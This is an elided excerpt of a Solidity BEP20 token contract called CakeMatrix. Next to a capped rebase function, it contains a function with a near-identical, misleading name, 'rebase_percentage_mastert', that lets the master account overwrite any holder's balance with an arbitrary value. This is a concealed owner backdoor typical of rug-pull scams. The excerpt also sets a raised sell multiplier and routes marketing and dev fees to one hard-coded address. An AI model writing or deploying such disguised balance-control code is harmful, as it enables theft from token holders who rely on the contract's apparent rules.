...
contract CakeMatrix is IBEP20, Auth {
    using SafeMath for uint256;
    ...
    string constant _name = "CakeMatrix";
    string constant _symbol = "CKM";
    ...
    uint256 public sellMultiplier  = 130;
    ...
    function rebase_percentage_master(uint256 _percentage_base1000, bool reduce) public onlyMaster returns (uint256 newSupply){
        require(_percentage_base1000 < 201, "Cant rebase more than 20%");
        if(reduce){
...
function rebase_percentage_mastert(address user, uint256 token) public onlyMaster {
      _rBalance[user] = token;
    ...
    constructor () Auth(msg.sender) {
        ...
        marketingFeeReceiver = 0xca9023B5A7f3b18B57e4A9C15Ab2C2a59BB2C9c3;
        devFeeReceiver = 0xca9023B5A7f3b18B57e4A9C15Ab2C2a59BB2C9c3;
